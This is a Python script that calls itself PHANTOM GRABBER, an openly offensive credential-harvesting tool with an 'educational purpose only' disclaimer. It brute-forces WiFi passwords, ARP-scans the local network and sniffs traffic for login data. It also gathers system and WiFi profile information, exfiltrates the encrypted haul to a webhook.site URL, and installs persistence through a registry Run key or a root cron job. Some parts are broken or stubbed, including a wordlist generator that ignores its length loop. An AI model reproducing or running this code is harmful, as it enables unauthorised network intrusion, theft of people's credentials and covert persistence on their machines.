#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PHANTOM_GRABBER - Advanced Network Credential Harvesting Suite
Educational Purpose Only - Author Not Responsible for Misuse
"""

import subprocess
import os
import sys
import requests
import json
import threading
import time
import socket
import base64
from cryptography.fernet import Fernet
from scapy.all import *
import wifi
import itertools
import string

# RED ASCII ART - PHANTOM SYMBOL
RED = '\033[91m'
RESET = '\033[0m'

ASCII_ART = f"""
{RED}
▓█████▄  ██▀███   ▄████▄   ██▓     ███▄ ▄███▓ ▄▄▄       ███▄    █ 
▒██▀ ██▌▓██ ▒ ██▒▒██▀ ▀▀  ▓██▒    ▓██▒▀█▀ ██▒▒████▄     ██ ▀█   █ 
░██   █▌▓██ ░▄█ ▒▒▓█    ▄ ▒██░    ▓██    ▓██░▒██  ▀█▄  ▓██  ▀█ ██▒
░▓█▄   ▌▒██▀▀█▄  ▒▓▓▄ ▄██▒▒██░    ▒██    ▒██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒
░▒████▓ ░██▓ ▒██▒▒ ▓███▀ ░░██████▒▒██▒   ░██▒ ▓█   ▓██▒▒██░   ▓██░
 ▒▒▓  ▒ ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░ ▒░▓  ░░ ▒░   ░  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ 
 ░ ▒  ▒   ░▒ ░ ▒░  ░  ▒   ░ ░ ▒  ░░  ░      ░  ▒   ▒▒ ░░ ░░   ░ ▒░
 ░ ░  ░   ░░   ░ ░          ░ ░   ░      ░     ░   ▒      ░   ░ ░ 
   ░       ░     ░ ░          ░  ░       ░         ░  ░         ░ 
 ░               ░                                                 
{RESET}
{RED}𖤐 DEV: SATAN SPAM 𖤐̸̷{RESET}
{RED}▄︻デ══━一  PHANTOM GRABBER v2.0  ▄︻デ══━一{RESET}
"""

class PhantomHarvester:
    def __init__(self):
        print(ASCII_ART)
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
        self.collected_data = []
        self.target_ssids = []
        
    def generate_wordlist(self):
        """Create comprehensive password dictionary"""
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        with open("pass.txt", "w") as f:
            # Basic combinations
            for length in range(8, 13):
                for combo in itertools.product(chars, repeat=3):
                    f.write(''.join(combo) + '\n')
                    
    def wifi_cracker(self):
        """Advanced WiFi penetration module"""
        try:
            networks = wifi.Cell.all('wlan0')
            for network in networks:
                print(f"{RED}[*] Targeting: {network.ssid}{RESET}")
                self.target_ssids.append(network.ssid)
                
                # Brute force attack
                with open("pass.txt", "r") as wordlist:
                    for password in wordlist:
                        password = password.strip()
                        try:
                            # Attempt connection
                            scheme = wifi.Scheme.for_cell('wlan0', network.ssid, network, password)
                            scheme.activate()
                            print(f"{RED}[+] SUCCESS: {network.ssid} - {password}{RESET}")
                            self.log_credentials(network.ssid, password)
                            break
                        except:
                            continue
        except Exception as e:
            print(f"{RED}WiFi Error: {e}{RESET}")

    def network_scanner(self):
        """Stealth network reconnaissance"""
        try:
            # ARP scan for local devices
            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"), timeout=2, verbose=0)
            
            for sent, received in ans:
                device_info = {
                    'ip': received.psrc,
                    'mac': received.hwsrc,
                    'timestamp': time.time()
                }
                self.collected_data.append(device_info)
                print(f"{RED}[+] Device Found: {received.psrc} - {received.hwsrc}{RESET}")
                
        except Exception as e:
            print(f"{RED}Scan Error: {e}{RESET}")

    def packet_sniffer(self):
        """Network traffic interception"""
        def packet_handler(packet):
            if packet.haslayer(TCP) and packet.haslayer(Raw):
                payload = packet[Raw].load
                if b'password' in payload.lower() or b'login' in payload.lower():
                    self.log_packet(payload)
                    
        sniff(prn=packet_handler, store=0, count=1000)

    def system_info_harvester(self):
        """Comprehensive system data collection"""
        system_data = {}
        
        # Network config
        result = subprocess.check_output(['ipconfig', '/all'] if os.name == 'nt' else ['ifconfig'], shell=True)
        system_data['network'] = result.decode('utf-8', errors='ignore')
        
        # WiFi profiles (Windows)
        if os.name == 'nt':
            profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], shell=True)
            system_data['wifi_profiles'] = profiles.decode('utf-8', errors='ignore')
            
        self.collected_data.append(system_data)

    def data_exfiltrator(self, webhook_url):
        """Stealth data exfiltration"""
        encrypted_data = self.cipher.encrypt(json.dumps(self.collected_data).encode())
        
        try:
            files = {'file': ('data.enc', encrypted_data)}
            requests.post(webhook_url, files=files, timeout=10)
        except:
            # Fallback to email
            self.email_exfiltration(encrypted_data)

    def email_exfiltration(self, data):
        """Alternative exfiltration method"""
        # SMTP implementation would go here
        pass

    def persistence_mechanism(self):
        """Install persistence mechanism"""
        if os.name == 'nt':
            # Windows registry persistence
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            try:
                reg_key = winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(reg_key, "SystemUpdate", 0, winreg.REG_SZ, sys.executable)
                winreg.CloseKey(reg_key)
            except: pass
        else:
            # Linux crontab persistence
            with open("/etc/cron.d/system_update", "w") as f:
                f.write("* * * * * root python3 {}\n".format(__file__))

    def log_credentials(self, ssid, password):
        """Encrypt and store credentials"""
        creds = f"SSID: {ssid} | Password: {password}"
        encrypted = self.cipher.encrypt(creds.encode())
        with open("creds.enc", "ab") as f:
            f.write(encrypted + b'\n')

    def log_packet(self, payload):
        """Log intercepted packets"""
        encrypted = self.cipher.encrypt(payload)
        with open("packets.enc", "ab") as f:
            f.write(encrypted + b'\n')

    def execute_all(self):
        """Main execution routine"""
        print(f"{RED}[!] Phantom Grabber Activated{RESET}")
        
        # Generate wordlist
        self.generate_wordlist()
        
        # Start parallel threads
        threads = []
        threads.append(threading.Thread(target=self.wifi_cracker))
        threads.append(threading.Thread(target=self.network_scanner))
        threads.append(threading.Thread(target=self.packet_sniffer))
        threads.append(threading.Thread(target=self.system_info_harvester))
        
        for thread in threads:
            thread.daemon = True
            thread.start()
            
        # Wait for completion
        for thread in threads:
            thread.join(timeout=300)
            
        # Exfiltrate data
        self.data_exfiltrator("https://webhook.site/YOUR_WEBHOOK")
        
        # Install persistence
        self.persistence_mechanism()
        
        print(f"{RED}[!] Operation Complete - Data Exfiltrated{RESET}")

if __name__ == "__main__":
    harvester = PhantomHarvester()
    harvester.execute_all()
